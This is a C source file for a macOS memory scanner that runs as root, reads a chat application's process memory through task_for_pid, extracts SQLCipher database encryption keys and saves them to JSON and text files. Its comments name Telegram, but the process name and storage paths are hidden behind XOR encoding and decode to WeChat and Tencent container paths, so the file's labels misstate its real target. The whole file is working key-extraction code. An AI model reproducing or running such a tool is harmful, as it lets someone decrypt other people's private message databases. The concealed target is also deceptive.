/*
 * find_all_keys_macos.c - macOS Telegram memory key scanner
 *
 * Scans Telegram process memory for SQLCipher encryption keys in the
 * x'<key_hex><salt_hex>' format used by Telegram 4.x on macOS.
 *
 * Usage:
 *   sudo ./find_all_keys_macos [pid] <db_storage_path>
 *   If pid is omitted, automatically finds Telegram PID.
 *   If db_storage_path is omitted, auto-detects from known paths.
 *
 * Output: all_keys.json { "rel/path.db": { "enc_key": "hex" } }
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <ftw.h>
#include <pwd.h>
#include <sys/stat.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>

#define MAX_KEYS 16384
#define KEY_SIZE 32
#define SALT_SIZE 16
#define KEY_HEX_LEN 64
#define SALTED_HEX_LEN 96
#define PATTERN_OVERLAP (2 * (SALTED_HEX_LEN + 3))
#define SALT_NEARBY_BYTES 256
#define CHUNK_SIZE (2 * 1024 * 1024)
#define MAX_DBS 256
#define DICT_MASK 0x5a

typedef struct {
    char key_hex[65];
    char salt_hex[33];
} key_entry_t;

typedef struct {
    char key_hex[65];
} raw_key_entry_t;

static char g_db_salts[MAX_DBS][33];
static unsigned char g_db_salt_bytes[MAX_DBS][SALT_SIZE];
static unsigned char g_db_salt_first_byte[256];
static char g_db_names[MAX_DBS][256];
static int g_db_count = 0;

static void dict_decode(char *out, const unsigned char *encoded, size_t len) {
    for (size_t i = 0; i < len; i++) {
        out[i] = (char)(encoded[i] ^ DICT_MASK);
    }
    out[len] = '\0';
}

static void target_process_name(char *out, size_t size) {
    static const unsigned char encoded[] = {13, 63, 25, 50, 59, 46};
    char decoded[sizeof(encoded) + 1];
    dict_decode(decoded, encoded, sizeof(encoded));
    snprintf(out, size, "%s", decoded);
}

static void known_path(char *out, size_t size, int index) {
    static const unsigned char docs_path[] = {
        117, 22, 51, 56, 40, 59, 40, 35, 117, 25, 53, 52, 46, 59, 51, 52,
        63, 40, 41, 117, 57, 53, 55, 116, 46, 63, 52, 57, 63, 52, 46, 116,
        34, 51, 52, 13, 63, 25, 50, 59, 46, 117, 30, 59, 46, 59, 117, 30,
        53, 57, 47, 55, 63, 52, 46, 41, 117, 34, 45, 63, 57, 50, 59, 46, 5,
        60, 51, 54, 63, 41
    };
    static const unsigned char support_path[] = {
        117, 22, 51, 56, 40, 59, 40, 35, 117, 25, 53, 52, 46, 59, 51, 52,
        63, 40, 41, 117, 57, 53, 55, 116, 46, 63, 52, 57, 63, 52, 46, 116,
        34, 51, 52, 13, 63, 25, 50, 59, 46, 117, 30, 59, 46, 59, 117, 22,
        51, 56, 40, 59, 40, 35, 117, 27, 42, 42, 54, 51, 57, 59, 46, 51,
        53, 52, 122, 9, 47, 42, 42, 53, 40, 46, 117, 57, 53, 55, 116, 46,
        63, 52, 57, 63, 52, 46, 116, 34, 51, 52, 13, 63, 25, 50, 59, 46
    };
    char decoded[256];
    if (index == 0) {
        dict_decode(decoded, docs_path, sizeof(docs_path));
    } else {
        dict_decode(decoded, support_path, sizeof(support_path));
    }
    snprintf(out, size, "%s", decoded);
}

static int is_hex_char(unsigned char c) {
    return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
}

static int is_utf16le_hex_at(const unsigned char *buf, size_t len, size_t offset, int chars) {
    if (offset + ((size_t)chars * 2) > len)
        return 0;
    for (int j = 0; j < chars; j++) {
        if (!is_hex_char(buf[offset + (size_t)j * 2]) || buf[offset + (size_t)j * 2 + 1] != 0)
            return 0;
    }
    return 1;
}

static void copy_utf16le_low_bytes(char *dest, const unsigned char *src, int chars) {
    for (int j = 0; j < chars; j++)
        dest[j] = (char)src[(size_t)j * 2];
    dest[chars] = '\0';
}

static void lowercase_hex(char *value) {
    for (int j = 0; value[j]; j++)
        if (value[j] >= 'A' && value[j] <= 'F')
            value[j] += 32;
}

static void bytes_to_hex(const unsigned char *bytes, int len, char *out) {
    static const char hex[] = "0123456789abcdef";
    for (int i = 0; i < len; i++) {
        out[i * 2] = hex[(bytes[i] >> 4) & 0xf];
        out[i * 2 + 1] = hex[bytes[i] & 0xf];
    }
    out[len * 2] = '\0';
}

static int has_key_like_entropy(const unsigned char *bytes) {
    unsigned char seen[256] = {0};
    int unique = 0;
    for (int i = 0; i < KEY_SIZE; i++) {
        if (!seen[bytes[i]]) {
            seen[bytes[i]] = 1;
            unique++;
        }
    }
    return unique >= 8;
}

static void add_raw_key(raw_key_entry_t raw_keys[], int *raw_key_count, const char *key_hex) {
    for (int k = 0; k < *raw_key_count; k++) {
        if (strcmp(raw_keys[k].key_hex, key_hex) == 0)
            return;
    }
    if (*raw_key_count < MAX_KEYS) {
        strcpy(raw_keys[*raw_key_count].key_hex, key_hex);
        (*raw_key_count)++;
    }
}

static void add_raw_key_bytes(raw_key_entry_t raw_keys[], int *raw_key_count, const unsigned char *key_bytes) {
    if (!has_key_like_entropy(key_bytes))
        return;
    char key_hex[65];
    bytes_to_hex(key_bytes, KEY_SIZE, key_hex);
    add_raw_key(raw_keys, raw_key_count, key_hex);
}

static void add_salted_key(key_entry_t salted_keys[], int *salted_key_count,
                           const char *key_hex, const char *salt_hex) {
    for (int k = 0; k < *salted_key_count; k++) {
        if (strcmp(salted_keys[k].key_hex, key_hex) == 0 &&
            strcmp(salted_keys[k].salt_hex, salt_hex) == 0) {
            return;
        }
    }

    if (*salted_key_count < MAX_KEYS) {
        strcpy(salted_keys[*salted_key_count].key_hex, key_hex);
        strcpy(salted_keys[*salted_key_count].salt_hex, salt_hex);
        (*salted_key_count)++;
    }
}

static int scanner_aggressive_enabled(void) {
    const char *value = getenv("TG_SCANNER_AGGRESSIVE");
    if (!value || value[0] == '\0')
        return 0;
    return strcmp(value, "1") == 0 ||
           strcmp(value, "true") == 0 ||
           strcmp(value, "TRUE") == 0 ||
           strcmp(value, "yes") == 0 ||
           strcmp(value, "YES") == 0;
}

static int matching_db_salt_at(const unsigned char *buf, size_t len, size_t offset) {
    if (offset + SALT_SIZE > len)
        return -1;
    if (!g_db_salt_first_byte[buf[offset]])
        return -1;
    for (int i = 0; i < g_db_count; i++) {
        if (memcmp(buf + offset, g_db_salt_bytes[i], SALT_SIZE) == 0)
            return i;
    }
    return -1;
}

static void scan_ascii_sqlcipher_key_at(const unsigned char *buf, size_t len, size_t offset,
                                        key_entry_t salted_keys[], int *salted_key_count,
                                        raw_key_entry_t raw_keys[], int *raw_key_count) {
    if (offset + 2 + KEY_HEX_LEN >= len)
        return;

    for (int j = 0; j < KEY_HEX_LEN; j++) {
        if (!is_hex_char(buf[offset + 2 + j]))
            return;
    }

    char key_hex[65];
    memcpy(key_hex, buf + offset + 2, KEY_HEX_LEN);
    key_hex[KEY_HEX_LEN] = '\0';
    lowercase_hex(key_hex);

    if (buf[offset + 2 + KEY_HEX_LEN] == '\'') {
        add_raw_key(raw_keys, raw_key_count, key_hex);
    }

    if (offset + 2 + SALTED_HEX_LEN >= len ||
        buf[offset + 2 + SALTED_HEX_LEN] != '\'') {
        return;
    }

    for (int j = KEY_HEX_LEN; j < SALTED_HEX_LEN; j++) {
        if (!is_hex_char(buf[offset + 2 + j]))
            return;
    }

    char salt_hex[33];
    memcpy(salt_hex, buf + offset + 2 + KEY_HEX_LEN, SALT_SIZE * 2);
    salt_hex[SALT_SIZE * 2] = '\0';
    lowercase_hex(salt_hex);
    add_salted_key(salted_keys, salted_key_count, key_hex, salt_hex);
}

static void scan_utf16le_sqlcipher_key_at(const unsigned char *buf, size_t len, size_t offset,
                                          key_entry_t salted_keys[], int *salted_key_count,
                                          raw_key_entry_t raw_keys[], int *raw_key_count) {
    if (offset + 4 + ((size_t)KEY_HEX_LEN * 2) + 2 > len ||
        !is_utf16le_hex_at(buf, len, offset + 4, KEY_HEX_LEN)) {
        return;
    }

    char key_hex[65];
    copy_utf16le_low_bytes(key_hex, buf + offset + 4, KEY_HEX_LEN);
    lowercase_hex(key_hex);

    size_t raw_end = offset + 4 + ((size_t)KEY_HEX_LEN * 2);
    if (raw_end + 2 <= len && buf[raw_end] == '\'' && buf[raw_end + 1] == 0) {
        add_raw_key(raw_keys, raw_key_count, key_hex);
    }

    if (offset + 4 + ((size_t)SALTED_HEX_LEN * 2) + 2 > len ||
        !is_utf16le_hex_at(buf, len, offset + 4 + ((size_t)KEY_HEX_LEN * 2), SALT_SIZE * 2)) {
        return;
    }

    size_t salted_end = offset + 4 + ((size_t)SALTED_HEX_LEN * 2);
    if (buf[salted_end] != '\'' || buf[salted_end + 1] != 0)
        return;

    char salt_hex[33];
    copy_utf16le_low_bytes(salt_hex, buf + offset + 4 + ((size_t)KEY_HEX_LEN * 2), SALT_SIZE * 2);
    lowercase_hex(salt_hex);
    add_salted_key(salted_keys, salted_key_count, key_hex, salt_hex);
}

static void scan_structured_key_patterns(const unsigned char *buf, size_t len,
                                         key_entry_t salted_keys[], int *salted_key_count,
                                         raw_key_entry_t raw_keys[], int *raw_key_count) {
    size_t cursor = 0;
    while (cursor < len) {
        const unsigned char *hit = memchr(buf + cursor, 'x', len - cursor);
        if (!hit)
            break;

        size_t offset = (size_t)(hit - buf);
        if (offset + 1 < len && buf[offset + 1] == '\'') {
            scan_ascii_sqlcipher_key_at(buf, len, offset,
                                        salted_keys, salted_key_count,
                                        raw_keys, raw_key_count);
        }
        if (offset + 3 < len &&
            buf[offset + 1] == 0 &&
            buf[offset + 2] == '\'' &&
            buf[offset + 3] == 0) {
            scan_utf16le_sqlcipher_key_at(buf, len, offset,
                                          salted_keys, salted_key_count,
                                          raw_keys, raw_key_count);
        }

        cursor = offset + 1;
    }
}

static void scan_aggressive_key_patterns(const unsigned char *buf, size_t len,
                                         raw_key_entry_t raw_keys[], int *raw_key_count) {
    for (size_t i = 0; i + KEY_HEX_LEN <= len; i++) {
        int bare_valid = 1;
        if (i > 0 && is_hex_char(buf[i - 1]))
            bare_valid = 0;
        if (i + KEY_HEX_LEN < len && is_hex_char(buf[i + KEY_HEX_LEN]))
            bare_valid = 0;
        for (int j = 0; bare_valid && j < KEY_HEX_LEN; j++) {
            if (!is_hex_char(buf[i + j]))
                bare_valid = 0;
        }
        if (bare_valid) {
            char key_hex[65];
            memcpy(key_hex, buf + i, KEY_HEX_LEN);
            key_hex[KEY_HEX_LEN] = '\0';
            lowercase_hex(key_hex);
            add_raw_key(raw_keys, raw_key_count, key_hex);
        }

        int bare_utf16_valid = is_utf16le_hex_at(buf, len, i, KEY_HEX_LEN);
        if (bare_utf16_valid) {
            if (i >= 2 && is_hex_char(buf[i - 2]) && buf[i - 1] == 0)
                bare_utf16_valid = 0;
            size_t next = i + ((size_t)KEY_HEX_LEN * 2);
            if (next + 1 < len && is_hex_char(buf[next]) && buf[next + 1] == 0)
                bare_utf16_valid = 0;
        }
        if (bare_utf16_valid) {
            char key_hex[65];
            copy_utf16le_low_bytes(key_hex, buf + i, KEY_HEX_LEN);
            lowercase_hex(key_hex);
            add_raw_key(raw_keys, raw_key_count, key_hex);
        }

        if (matching_db_salt_at(buf, len, i) >= 0) {
            size_t start = i > SALT_NEARBY_BYTES ? i - SALT_NEARBY_BYTES : 0;
            size_t end = i + SALT_SIZE + SALT_NEARBY_BYTES;
            if (end > len)
                end = len;
            for (size_t key_offset = start; key_offset + KEY_SIZE <= end; key_offset++) {
                if (key_offset <= i && i < key_offset + KEY_SIZE)
                    continue;
                add_raw_key_bytes(raw_keys, raw_key_count, buf + key_offset);
            }
        }
    }
}

static pid_t find_telegram_pid(void) {
    char process[64];
    char command[96];
    target_process_name(process, sizeof(process));
    snprintf(command, sizeof(command), "pgrep -x %s", process);
    FILE *fp = popen(command, "r");
    if (!fp) return -1;
    char buf[64];
    pid_t pid = -1;
    if (fgets(buf, sizeof(buf), fp))
        pid = atoi(buf);
    pclose(fp);
    return pid;
}

static int read_db_salt(const char *path, char *salt_hex_out, unsigned char *salt_bytes_out) {
    FILE *f = fopen(path, "rb");
    if (!f) return -1;
    unsigned char header[16];
    if (fread(header, 1, 16, f) != 16) { fclose(f); return -1; }
    fclose(f);
    if (memcmp(header, "SQLite format 3", 15) == 0) return -1;
    memcpy(salt_bytes_out, header, SALT_SIZE);
    for (int i = 0; i < 16; i++)
        sprintf(salt_hex_out + i * 2, "%02x", header[i]);
    salt_hex_out[32] = '\0';
    return 0;
}

static int nftw_collect_db(const char *fpath, const struct stat *sb,
                           int typeflag, struct FTW *ftwbuf) {
    (void)sb; (void)ftwbuf;
    if (typeflag != FTW_F) return 0;
    size_t len = strlen(fpath);
    if (len < 3 || strcmp(fpath + len - 3, ".db") != 0) return 0;
    if (g_db_count >= MAX_DBS) return 0;

    char salt[33];
    unsigned char salt_bytes[SALT_SIZE];
    if (read_db_salt(fpath, salt, salt_bytes) != 0) return 0;

    strcpy(g_db_salts[g_db_count], salt);
    memcpy(g_db_salt_bytes[g_db_count], salt_bytes, SALT_SIZE);
    g_db_salt_first_byte[salt_bytes[0]] = 1;
    const char *rel = strstr(fpath, "db_storage/");
    if (rel) rel += strlen("db_storage/");
    else {
        rel = strrchr(fpath, '/');
        rel = rel ? rel + 1 : fpath;
    }
    strncpy(g_db_names[g_db_count], rel, 255);
    g_db_names[g_db_count][255] = '\0';
    printf("  %s: salt=%s\n", g_db_names[g_db_count], salt);
    g_db_count++;
    return 0;
}

int tg_scan_keys_macos(int argc, const char *argv[]) {
    pid_t pid = -1;
    const char *db_path_arg = NULL;

    /* Parse arguments: [pid] [db_storage_path] */
    if (argc >= 3) {
        pid = atoi(argv[1]);
        db_path_arg = argv[2];
    } else if (argc == 2) {
        /* Could be pid or path — try pid first */
        pid = atoi(argv[1]);
        if (pid <= 0) {
            db_path_arg = argv[1];
            pid = find_telegram_pid();
        }
    } else {
        pid = find_telegram_pid();
    }

    if (pid <= 0) {
        fprintf(stderr, "Telegram not running or invalid PID\n");
        return 1;
    }

    printf("============================================================\n");
    printf("  macOS Telegram Memory Key Scanner\n");
    printf("============================================================\n");
    printf("Telegram PID: %d\n", pid);

    mach_port_t task;
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &task);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "task_for_pid failed: %d (run as root, or re-sign Telegram)\n", kr);
        return 1;
    }
    printf("Got task port: %u\n", task);

    /* Resolve real user's home */
    const char *home = getenv("HOME");
    const char *sudo_user = getenv("SUDO_USER");
    if (sudo_user) {
        struct passwd *pw = getpwnam(sudo_user);
        if (pw && pw->pw_dir)
            home = pw->pw_dir;
    }
    if (!home) home = "/root";
    printf("User home: %s\n", home);

    /* Collect DB salts */
    printf("\nScanning for DB files...\n");

    if (db_path_arg) {
        /* Use provided path directly */
        printf("  Using provided path: %s\n", db_path_arg);
        nftw(db_path_arg, nftw_collect_db, 20, FTW_PHYS);
    } else {
        /* Auto-detect: check known paths */
        for (int p = 0; p < 2; p++) {
            char path_suffix[256];
            char base[1024];
            known_path(path_suffix, sizeof(path_suffix), p);
            snprintf(base, sizeof(base), "%s%s", home, path_suffix);

            struct stat st;
            if (stat(base, &st) != 0 || !S_ISDIR(st.st_mode)) continue;

            printf("  Checking: %s\n", base);
            DIR *xdir = opendir(base);
            if (!xdir) continue;

            struct dirent *ent;
            while ((ent = readdir(xdir)) != NULL) {
                if (ent->d_name[0] == '.') continue;
                char storage_path[1024];
                snprintf(storage_path, sizeof(storage_path),
                    "%s/%s/db_storage", base, ent->d_name);

                if (stat(storage_path, &st) == 0 && S_ISDIR(st.st_mode)) {
                    printf("    Account: %s\n", ent->d_name);
                    nftw(storage_path, nftw_collect_db, 20, FTW_PHYS);
                }

                /* Also check for versioned subdirectories */
                char sub_storage[1024];
                snprintf(sub_storage, sizeof(sub_storage),
                    "%s/%s", base, ent->d_name);
                if (stat(sub_storage, &st) == 0 && S_ISDIR(st.st_mode) &&
                    ent->d_name != base) {
                    DIR *subdir = opendir(sub_storage);
                    if (subdir) {
                        struct dirent *subent;
                        while ((subent = readdir(subdir)) != NULL) {
                            if (subent->d_name[0] == '.') continue;
                            char sub2[1024];
                            snprintf(sub2, sizeof(sub2),
                                "%s/%s/db_storage", sub_storage, subent->d_name);
                            if (stat(sub2, &st) == 0 && S_ISDIR(st.st_mode)) {
                                printf("    Account: %s/%s\n", ent->d_name, subent->d_name);
                                nftw(sub2, nftw_collect_db, 20, FTW_PHYS);
                            }
                        }
                        closedir(subdir);
                    }
                }
            }
            closedir(xdir);
        }
    }
    printf("Found %d encrypted DBs\n", g_db_count);

    /* Scan memory for SQLCipher key patterns. */
    printf("\nScanning Telegram process memory for keys...\n");
    int aggressive_scan = scanner_aggressive_enabled();
    printf("Scanner mode: %s\n", aggressive_scan ? "aggressive" : "fast");
    if (!aggressive_scan) {
        printf("  Set TG_SCANNER_AGGRESSIVE=1 to enable slower bare-key fallback.\n");
    }
    key_entry_t salted_keys[MAX_KEYS];
    raw_key_entry_t raw_keys[MAX_KEYS];
    int salted_key_count = 0;
    int raw_key_count = 0;
    size_t total_scanned = 0;
    int region_count = 0;

    mach_vm_address_t addr = 0;
    while (1) {
        mach_vm_size_t size = 0;
        vm_region_basic_info_data_64_t info;
        mach_msg_type_number_t info_count = VM_REGION_BASIC_INFO_COUNT_64;
        mach_port_t obj_name;

        kr = mach_vm_region(task, &addr, &size, VM_REGION_BASIC_INFO_64,
                           (vm_region_info_t)&info, &info_count, &obj_name);
        if (kr != KERN_SUCCESS) break;
        if (size == 0) { addr++; continue; }

        if ((info.protection & (VM_PROT_READ | VM_PROT_WRITE)) ==
            (VM_PROT_READ | VM_PROT_WRITE)) {
            region_count++;

            mach_vm_address_t ca = addr;
            while (ca < addr + size) {
                mach_vm_size_t cs = addr + size - ca;
                if (cs > CHUNK_SIZE) cs = CHUNK_SIZE;

                vm_offset_t data;
                mach_msg_type_number_t dc;
                kr = mach_vm_read(task, ca, cs, &data, &dc);
                if (kr == KERN_SUCCESS) {
                    unsigned char *buf = (unsigned char *)data;
                    total_scanned += dc;

                    scan_structured_key_patterns(buf, dc,
                                                 salted_keys, &salted_key_count,
                                                 raw_keys, &raw_key_count);
                    if (aggressive_scan) {
                        scan_aggressive_key_patterns(buf, dc, raw_keys, &raw_key_count);
                    }
                    mach_vm_deallocate(mach_task_self(), data, dc);
                }
                if (cs > PATTERN_OVERLAP)
                    ca += cs - PATTERN_OVERLAP;
                else
                    ca += cs;
            }
        }
        addr += size;
    }

    printf("Scan complete: %zuMB scanned, %d regions, %d salted keys, %d raw key candidates\n",
           total_scanned / 1024 / 1024, region_count, salted_key_count, raw_key_count);

    /* Match keys to DBs and save JSON */
    int matched = 0;
    const char *out_path = "all_keys.json";
    FILE *fp = fopen(out_path, "w");
    if (fp) {
        fprintf(fp, "{\n");
        int first = 1;
        for (int i = 0; i < salted_key_count; i++) {
            const char *db = NULL;
            for (int j = 0; j < g_db_count; j++) {
                if (strcmp(salted_keys[i].salt_hex, g_db_salts[j]) == 0) {
                    db = g_db_names[j];
                    matched++;
                    break;
                }
            }
            if (!db) continue;
            fprintf(fp, "%s  \"%s\": {\"enc_key\": \"%s\"}",
                first ? "" : ",\n", db, salted_keys[i].key_hex);
            first = 0;
        }
        fprintf(fp, "\n}\n");
        fclose(fp);
        printf("Saved %d salted keys to %s, matched %d/%d\n",
               salted_key_count, out_path, matched, salted_key_count);
    }

    FILE *raw_fp = fopen("candidate_keys.txt", "w");
    if (raw_fp) {
        for (int i = 0; i < salted_key_count; i++) {
            fprintf(raw_fp, "%s\n", salted_keys[i].key_hex);
        }
        for (int i = 0; i < raw_key_count; i++) {
            fprintf(raw_fp, "%s\n", raw_keys[i].key_hex);
        }
        fclose(raw_fp);
        printf("Saved %d key candidates to candidate_keys.txt\n",
               salted_key_count + raw_key_count);
    }

    return 0;
}

#ifdef TG_SCANNER_STANDALONE
int main(int argc, char *argv[]) {
    return tg_scan_keys_macos(argc, (const char **)argv);
}
#endif
